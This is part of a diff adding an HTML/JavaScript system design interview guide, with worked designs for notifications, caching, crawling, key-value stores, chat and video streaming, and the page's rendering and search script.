+  <div class="arch-row" style="margin-top:6px"><span class="arch-node success">Middleware</span><span class="arch-arrow">→</span><span class="arch-node info">Redis Cluster (shared counter)</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node success">count ≤ 100</span><span class="arch-arrow">→</span><span class="arch-node primary">Forward to App Server</span></div>
+  <div class="arch-row" style="margin-top:4px"><span class="arch-node danger">count > 100</span><span class="arch-arrow">→</span><span class="arch-node danger">429 Too Many Requests</span></div>
+</div>
+<p><strong>4. Edge cases</strong></p>
+<ul>
+<li>Redis down → fail open (allow requests) or fail closed. Fail open is safer for user experience.</li>
+<li>Multiple rate limit tiers: per-user (100/min), per-IP (200/min), per-plan (1000/min) — check all, return 429 if any exceeded</li>
+<li>Lua script for atomic INCR + EXPIRE (prevents race condition)</li>
+</ul>`},
+
+{id:'designs',section:'Full Designs',icon:'🏛️',level:'design',
+q:'Design a notification system (like push/email/SMS)',
+a:`<div class="scenario-box"><div class="scenario-label">Scenario</div><div class="scenario-text">Design a notification system that can send push notifications, emails, and SMS to 100M users. Must handle 1M notifications/min, support retries, avoid duplicates, and respect user preferences.</div></div>
+<p><strong>1. Key requirements</strong></p>
+<ul>
+<li>Multiple channels: push, email, SMS, in-app</li>
+<li>User preferences: opt-out per channel per type</li>
+<li>Reliability: at-least-once delivery with dedup</li>
+<li>Scalability: 1M notifs/min = ~16,667/sec</li>
+</ul>
+<p><strong>2. Architecture</strong></p>
+<div class="arch-box">
+  <div class="arch-title">Notification System</div>
+  <div class="arch-row"><span class="arch-node primary">Trigger Service</span><span class="arch-arrow">→</span><span class="arch-node warn">Notification API</span><span class="arch-arrow">→</span><span class="arch-node info">Kafka Topic</span></div>
+  <div class="arch-row" style="margin-top:6px">
+    <span class="arch-node success">Push Worker</span>
+    <span style="color:var(--text3);padding:0 6px">|</span>
+    <span class="arch-node success">Email Worker</span>
+    <span style="color:var(--text3);padding:0 6px">|</span>
+    <span class="arch-node success">SMS Worker</span>
+  </div>
+  <div class="arch-row" style="margin-top:6px">
+    <span class="arch-node">APNs/FCM</span>
+    <span style="color:var(--text3);padding:0 6px">|</span>
+    <span class="arch-node">SendGrid</span>
+    <span style="color:var(--text3);padding:0 6px">|</span>
+    <span class="arch-node">Twilio</span>
+  </div>
+</div>
+<p><strong>3. Key flows</strong></p>
+<pre>// Send notification
+1. Service calls: POST /notify { userId, type:"ORDER_SHIPPED", data }
+2. API checks user preferences → fetch from Redis/DB
+3. Enqueue to Kafka per channel: "push-queue", "email-queue"
+4. Channel workers dequeue and call 3rd party APIs
+
+// Deduplication
+notif_id = hash(userId + type + timestamp_bucket)
+if Redis.exists("sent:" + notif_id): skip
+Redis.setex("sent:" + notif_id, 86400, 1)</pre>
+<p><strong>4. Retry + DLQ</strong></p>
+<ul>
+<li>On delivery failure → retry with exponential backoff (3 attempts)</li>
+<li>After 3 failures → move to DLQ for inspection</li>
+<li>Track delivery status: PENDING → SENT → DELIVERED / FAILED</li>
+</ul>`},
+
+{id:'designs',section:'Full Designs',icon:'🏛️',level:'design',
+q:'Design a distributed cache (like Redis)',
+a:`<div class="scenario-box"><div class="scenario-label">Scenario</div><div class="scenario-text">Design a distributed in-memory cache that supports GET/SET/DELETE with TTL. Handles 1M QPS. Data must survive single-node failures. Support eviction policies.</div></div>
+<p><strong>1. Core data structure</strong></p>
+<pre>// In-memory hash map with metadata
+cache = {
+  "user:42": {
+    value: "{id:42, name:'Alice'}",
+    expiresAt: timestamp + ttl,
+    lastAccessed: timestamp    // for LRU
+  }
+}
+
+// LRU: maintain doubly-linked list + hash map
+// O(1) get: hash map lookup
+// O(1) evict: remove tail of linked list</pre>
+<p><strong>2. Distribution with consistent hashing</strong></p>
+<div class="arch-box">
+  <div class="arch-title">Distributed Cache Cluster</div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">Client-side Router (consistent hash)</span></div>
+  <div class="arch-row" style="margin-top:6px">
+    <span class="arch-node info">Node 1 (keys 0–120°)</span>
+    <span style="color:var(--text3);padding:0 6px">|</span>
+    <span class="arch-node info">Node 2 (keys 120–240°)</span>
+    <span style="color:var(--text3);padding:0 6px">|</span>
+    <span class="arch-node info">Node 3 (keys 240–360°)</span>
+  </div>
+</div>
+<p><strong>3. Replication for fault tolerance</strong></p>
+<pre>// Primary-Replica per shard
+Write: go to Primary → async replicate to Replica
+Read:  go to Primary (strong) OR Replica (eventual)
+
+If Primary fails:
+  Replica promoted to Primary (Sentinel monitors)
+  New replica added in background</pre>
+<p><strong>4. Eviction</strong></p>
+<ul>
+<li>When memory full: run LRU eviction on a sample of keys (Redis uses approximated LRU, not exact, for performance)</li>
+<li>TTL expiry: lazy (check on access) + active (background sweep 10 times/sec)</li>
+</ul>`},
+
+{id:'designs',section:'Full Designs',icon:'🏛️',level:'design',
+q:'Design a web crawler',
+a:`<div class="scenario-box"><div class="scenario-label">Scenario</div><div class="scenario-text">Design a web crawler that crawls 1 billion pages in 1 month. Must handle robots.txt, avoid duplicate pages, crawl politely, and store pages for search indexing.</div></div>
+<p><strong>1. Estimation</strong></p>
+<pre>1B pages / 30 days / 86400 sec = ~400 pages/sec
+Avg page size: 100KB → 400 × 100KB = 40MB/sec
+Total storage: 1B × 100KB = 100TB</pre>
+<p><strong>2. Architecture</strong></p>
+<div class="arch-box">
+  <div class="arch-title">Web Crawler Architecture</div>
+  <div class="arch-row"><span class="arch-node warn">URL Frontier (Priority Queue)</span><span class="arch-arrow">→</span><span class="arch-node primary">Fetcher Workers (400/sec)</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node primary">Fetcher</span><span class="arch-arrow">→</span><span class="arch-node success">DNS Resolver</span><span class="arch-arrow">→</span><span class="arch-node">HTTP GET</span><span class="arch-arrow">→</span><span class="arch-node info">Raw Page Store (S3)</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node info">S3 Page</span><span class="arch-arrow">→</span><span class="arch-node">Link Extractor</span><span class="arch-arrow">→</span><span class="arch-node warn">URL Dedup Filter</span><span class="arch-arrow">→</span><span class="arch-node warn">URL Frontier</span></div>
+</div>
+<p><strong>3. Key components</strong></p>
+<pre>// URL Frontier — prioritized queue
+High priority: news sites, popular domains
+Low priority:  rarely-updated or low-PageRank sites
+
+// Dedup — Bloom filter
+Already crawled? → Bloom filter check (O(1), space-efficient)
+1B URLs × 10 bits each = 10Gb Bloom filter → fits in RAM
+False positive rate: ~1% → acceptable, skip a few valid URLs
+
+// Politeness — rate limit per domain
+robots.txt: fetch and respect crawl-delay, Disallow rules
+Max 1 req/sec per domain; use per-domain queues</pre>
+<p><strong>4. Challenges</strong></p>
+<ul>
+<li>Spider traps (infinite URL loops) — URL depth limit (max 10 hops)</li>
+<li>Dynamic pages (JavaScript-rendered) — headless Chromium for JS sites</li>
+<li>Distributed DNS — cache DNS results per domain (~1M unique domains)</li>
+</ul>`},
+
+{id:'designs',section:'Full Designs',icon:'🏛️',level:'design',
+q:'Design a key-value store (like DynamoDB / Redis)',
+a:`<div class="scenario-box"><div class="scenario-label">Scenario</div><div class="scenario-text">Design a distributed key-value store supporting GET(key), PUT(key, value), DELETE(key). 100TB data, 1M writes/sec, 10M reads/sec. Strong consistency within a shard. Fault-tolerant.</div></div>
+<p><strong>1. Data model</strong></p>
+<pre>// Simple: key → value (binary blob, up to 1MB)
+put("user:42", "{name:'Alice', email:'alice@example.com'}")
+get("user:42") → "{name:'Alice', ...}"</pre>
+<p><strong>2. Partitioning with consistent hashing</strong></p>
+<pre>// Assign keys to nodes
+hash("user:42") = position 150° on ring
+→ assigned to Node B (next clockwise from 150°)
+
+// 100TB / 10 nodes = 10TB per node (manageable)</pre>
+<p><strong>3. Replication for fault tolerance</strong></p>
+<div class="arch-box">
+  <div class="arch-title">Replication Factor = 3</div>
+  <div class="arch-row"><span class="arch-node primary">Client PUT key=X</span><span class="arch-arrow">→</span><span class="arch-node warn">Coordinator Node</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node warn">Coordinator</span><span class="arch-arrow">→</span><span class="arch-node success">Primary Node</span><span class="arch-arrow">→</span><span class="arch-node info">Replica 1</span><span class="arch-arrow">→</span><span class="arch-node info">Replica 2</span></div>
+  <div class="arch-row" style="margin-top:4px"><span style="font-size:11px;color:var(--text3)">Write quorum W=2: wait for 2 of 3 nodes to ACK before returning success</span></div>
+</div>
+<p><strong>4. Consistency model (Quorum)</strong></p>
+<pre>N = 3 replicas, W = 2 (write quorum), R = 2 (read quorum)
+W + R > N → strong consistency guaranteed (2+2 > 3 ✓)
+
+If you want eventual consistency (more available):
+W = 1, R = 1 → faster but may read stale data</pre>
+<p><strong>5. Storage engine</strong></p>
+<ul>
+<li><strong>LSM-Tree</strong> (Log-Structured Merge) — optimized for writes. Used by LevelDB, RocksDB, Cassandra. Write to in-memory memtable → flush to SSTable files → merge compaction in background.</li>
+<li><strong>B-Tree</strong> — optimized for reads. Used by PostgreSQL, InnoDB. Better random read performance.</li>
+</ul>`},
+
+{id:'designs',section:'Full Designs',icon:'🏛️',level:'design',
+q:'Design a real-time chat system (like WhatsApp)',
+a:`<div class="scenario-box"><div class="scenario-label">Scenario</div><div class="scenario-text">Design a chat app supporting 1-on-1 and group chats (max 100 members). 500M DAU. Messages must be delivered in real-time and stored. Show online status. Support message history.</div></div>
+<p><strong>1. Estimation</strong></p>
+<pre>500M DAU × 40 messages/day = 20B messages/day
+20B / 86400 = ~230K messages/sec
+Avg message size: 200 bytes → 46MB/sec
+Storage: 20B × 200B × 365 = ~1.5PB/year</pre>
+<p><strong>2. Real-time delivery with WebSockets</strong></p>
+<div class="arch-box">
+  <div class="arch-title">Message Delivery Flow</div>
+  <div class="arch-row"><span class="arch-node primary">Alice (WS)</span><span class="arch-arrow">→</span><span class="arch-node warn">Chat Server A</span><span class="arch-arrow">→</span><span class="arch-node info">Kafka</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node info">Kafka</span><span class="arch-arrow">→</span><span class="arch-node">Message Store (Cassandra)</span></div>
+  <div class="arch-row" style="margin-top:4px"><span class="arch-node info">Kafka</span><span class="arch-arrow">→</span><span class="arch-node warn">Chat Server B</span><span class="arch-arrow">→</span><span class="arch-node success">Bob (WS push)</span></div>
+  <div class="arch-row" style="margin-top:4px"><span class="arch-node danger">Bob offline</span><span class="arch-arrow">→</span><span class="arch-node danger">Push Notification Service</span></div>
+</div>
+<p><strong>3. Routing (how server A finds Bob's server B)</strong></p>
+<pre>// Presence Service maps userId → serverId
+When Bob connects to Server B:
+  Redis.set("online:bob", "serverB")
+
+When Alice sends to Bob:
+  Lookup: Redis.get("online:bob") → "serverB"
+  Forward message to Server B via internal queue
+  Server B pushes to Bob's WebSocket</pre>
+<p><strong>4. Message storage — Cassandra schema</strong></p>
+<pre>// Wide-column model, partition by chat room
+Table: messages
+  chatId    UUID   (partition key)
+  sentAt    BIGINT (clustering key, descending)
+  senderId  UUID
+  content   TEXT
+  
+// Efficient query: get last 50 messages of a chat
+SELECT * FROM messages 
+WHERE chatId = ? 
+ORDER BY sentAt DESC LIMIT 50;</pre>
+<p><strong>5. Online status</strong></p>
+<ul>
+<li>Heartbeat: client pings every 30s. Server marks offline if no ping for 60s.</li>
+<li>Redis pub/sub: when Bob goes online, publish event; Bob's friends' servers subscribe and update their local state.</li>
+</ul>`},
+
+{id:'designs',section:'Full Designs',icon:'🏛️',level:'design',
+q:'Design a video streaming service (like YouTube)',
+a:`<div class="scenario-box"><div class="scenario-label">Scenario</div><div class="scenario-text">Design a video streaming service. Users can upload and watch videos. 2B DAU, 500 hours of video uploaded per minute, support adaptive bitrate streaming. Global distribution.</div></div>
+<p><strong>1. Estimation</strong></p>
+<pre>Upload: 500 hrs/min = 8.3 hrs/sec
+  1hr video raw = ~2GB → 8.3 × 2GB = 16.6GB/sec ingestion
+  After transcoding (multiple resolutions): ~10x expansion
+  Storage growth: ~166GB/sec
+
+Watch: 2B users × 1hr/day = 2B hrs/day
+  Average 720p bitrate: 2.5Mbps
+  2B × 1hr × 2.5Mbps = 18 Exabytes/day egress bandwidth
+  → CDN is mandatory (not optional)</pre>
+<p><strong>2. Upload & Processing Pipeline</strong></p>
+<div class="arch-box">
+  <div class="arch-title">Video Upload Pipeline</div>
+  <div class="arch-row"><span class="arch-node primary">Creator</span><span class="arch-arrow">→</span><span class="arch-node warn">Upload Service</span><span class="arch-arrow">→</span><span class="arch-node info">Raw Video (S3)</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node info">S3 Event</span><span class="arch-arrow">→</span><span class="arch-node">Kafka</span><span class="arch-arrow">→</span><span class="arch-node success">Transcoder Workers</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node success">Transcode</span><span class="arch-arrow">→</span><span class="arch-node">360p / 720p / 1080p / 4K chunks</span><span class="arch-arrow">→</span><span class="arch-node info">CDN Origin</span></div>
+</div>
+<p><strong>3. Adaptive Bitrate Streaming (HLS/DASH)</strong></p>
+<pre>// Video split into 10s chunks at multiple bitrates
+manifest.m3u8:
+  #EXTM3U
+  #EXT-X-STREAM-INF:BANDWIDTH=500000   → 360p/chunks/
+  #EXT-X-STREAM-INF:BANDWIDTH=2500000  → 720p/chunks/
+  #EXT-X-STREAM-INF:BANDWIDTH=8000000  → 1080p/chunks/
+
+// Player measures download speed, picks appropriate stream
+// Smooth quality transitions every 10 seconds</pre>
+<p><strong>4. CDN distribution</strong></p>
+<ul>
+<li>Popular videos cached at CDN edge (95% cache hit rate)</li>
+<li>Long-tail videos served from regional CDN nodes → S3 origin on miss</li>
+<li>Geo-routing: user in India hits Mumbai CDN, not US servers</li>
+</ul>
+<p><strong>5. Metadata & recommendations</strong></p>
+<pre>Video metadata → PostgreSQL (video_id, title, uploader, views)
+View counts   → Redis counters (batch flush to DB every min)
+Recommendations → Separate ML service (offline + real-time scoring)
+Search         → Elasticsearch (full-text on title/description/tags)</pre>`},
+
+];
+
+// ── Render ──────────────────────────────────────────────────────────
+let activeFilter = 'all';
+const STORAGE_KEY = 'system-design-guide:viewed';
+
+function readStorage(key) {
+  try {
+    return window.localStorage.getItem(key);
+  } catch {
+    return null;
+  }
+}
+
+function writeStorage(key, value) {
+  try {
+    window.localStorage.setItem(key, value);
+  } catch {
+    // Local preview/private browsing can block storage. The guide should still work.
+  }
+}
+
+function loadViewedSet() {
+  try {
+    const saved = JSON.parse(readStorage(STORAGE_KEY) || '[]');
+    return new Set(saved.filter(idx => Number.isInteger(idx) && idx >= 0 && idx < QA.length));
+  } catch {
+    return new Set();
+  }
+}
+
+let viewedSet = loadViewedSet();
+
+function saveViewed() {
+  writeStorage(STORAGE_KEY, JSON.stringify([...viewedSet]));
+}
+
+function updateStats() {
+  const total = QA.length;
+  const viewed = viewedSet.size;
+  const pct = total ? Math.round(viewed / total * 100) : 0;
+  const topicCount = new Set(QA.map(item => item.id)).size;
+  const counts = QA.reduce((acc, item) => {
+    acc[item.id] = (acc[item.id] || 0) + 1;
+    return acc;
+  }, {});
+  document.getElementById('total-q').textContent = total;
+  document.getElementById('viewed-q').textContent = viewed;
+  document.getElementById('total-topics').textContent = topicCount;
+  document.getElementById('pct').textContent = pct + '%';
+  document.getElementById('prog-label').textContent = pct + '%';
+  document.getElementById('prog-fill').style.width = pct + '%';
+  document.querySelectorAll('.nav-item').forEach(nav => {
+    const id = nav.getAttribute('href')?.slice(1);
+    const count = nav.querySelector('.nav-count');
+    if (count && counts[id]) count.textContent = counts[id];
+  });
+}
+
+function badgeHtml(level) {
+  const map = { basic:'badge-basic', intermediate:'badge-intermediate', advanced:'badge-advanced', design:'badge-design' };
+  return `<span class="badge ${map[level] || ''}">${level}</span>`;
+}
+
+function renderQA(data) {
+  const container = document.getElementById('qa-container');
+  const sections = {};
+  data.forEach(item => {
+    if (!sections[item.id]) sections[item.id] = { ...item, items: [] };
+    sections[item.id].items.push(item);
+  });
+
+  container.innerHTML = '';
+  let qNum = 1;
+  Object.values(sections).forEach(sec => {
+    const secDiv = document.createElement('div');
+    secDiv.className = 'section';
+    secDiv.id = sec.id;
+    secDiv.innerHTML = `<div class="section-header">
+      <div class="section-icon">${sec.icon}</div>
+      <div class="section-title">${sec.section}</div>
+      <div class="section-count">${sec.items.length} Q</div>
+    </div>`;
+
+    sec.items.forEach(item => {
+      const idx = QA.indexOf(item);
+      const isViewed = viewedSet.has(idx);
+      const isDesign = item.level === 'design';
+      const card = document.createElement('div');
+      card.className = `qa-card${isDesign ? ' design' : ''}`;
+      card.innerHTML = `<div class="qa-question" onclick="toggle(this, ${idx})">
+        <span class="qa-num">${String(qNum).padStart(2,'0')}</span>
+        <span class="qa-q-text">${item.q}</span>
+        <div class="qa-meta">
+          ${badgeHtml(item.level)}
+          <span class="viewed-dot${isViewed ? ' done' : ''}"></span>
+          <span class="chevron">▼</span>
+        </div>
+      </div>
+      <div class="qa-answer"><div class="ans-body">${item.a}</div></div>`;
+      secDiv.appendChild(card);
+      qNum++;
+    });
+
+    container.appendChild(secDiv);
+  });
+  updateStats();
+}
+
+function toggle(el, idx) {
+  const card = el.closest('.qa-card');
+  const wasOpen = card.classList.contains('open');
+  // close all
+  document.querySelectorAll('.qa-card.open').forEach(c => c.classList.remove('open'));
+  if (!wasOpen) {
+    card.classList.add('open');
+    viewedSet.add(idx);
+    saveViewed();
+    const dot = el.querySelector('.viewed-dot');
+    if (dot) dot.classList.add('done');
+    updateStats();
+  }
+}
+
+function setFilter(f, btn) {
+  activeFilter = f;
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  doSearch();
+}
+
+function doSearch() {
+  const q = document.getElementById('search').value.toLowerCase().trim();
+  let filtered = QA;
+  if (activeFilter !== 'all') filtered = filtered.filter(i => i.level === activeFilter);
+  if (q) filtered = filtered.filter(i => i.q.toLowerCase().includes(q) || i.a.toLowerCase().includes(q) || i.section.toLowerCase().includes(q));
+  const noRes = document.getElementById('no-results');
+  if (filtered.length === 0) {
+    document.getElementById('qa-container').innerHTML = '';
+    noRes.style.display = 'block';
+    document.getElementById('search-term').textContent = '"' + (q || activeFilter) + '"';
+  } else {
+    noRes.style.display = 'none';
+    renderQA(filtered);
+  }
+}
+
+// Sidebar active tracking
+window.addEventListener('scroll', () => {
+  const st = document.getElementById('scroll-top');
+  if (window.scrollY > 300) st.classList.add('visible');
+  else st.classList.remove('visible');
+
+  const sections = document.querySelectorAll('.section');
+  let current = '';
+  sections.forEach(s => { if (window.scrollY >= s.offsetTop - 120) current = s.id; });
+  document.querySelectorAll('.nav-item').forEach(n => {
+    n.classList.toggle('active', n.getAttribute('href') === '#' + current);
+  });
+});
+
+renderQA(QA);
+</script>
+</body>
+</html>
